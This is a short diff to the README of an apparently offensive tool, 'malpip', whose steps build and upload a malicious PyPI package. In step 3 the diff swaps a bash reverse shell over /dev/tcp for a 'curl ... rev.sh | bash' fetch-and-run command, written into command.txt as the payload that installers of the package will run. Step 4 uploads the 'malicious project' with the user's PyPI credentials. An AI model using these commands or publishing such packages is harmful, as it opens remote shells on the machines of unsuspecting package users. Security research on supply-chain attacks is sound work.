@@ -18,7 +18,7 @@ sudo ./malpip install
 ```
 3. Set the command to be executed.
 ```bash
-echo "/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1" > command.txt
+echo "curl -s http://localhost/rev.sh | bash" > command.txt
 ```
 4. Create malicious project.
 You will be asked for your pypi credentials to upload the project.
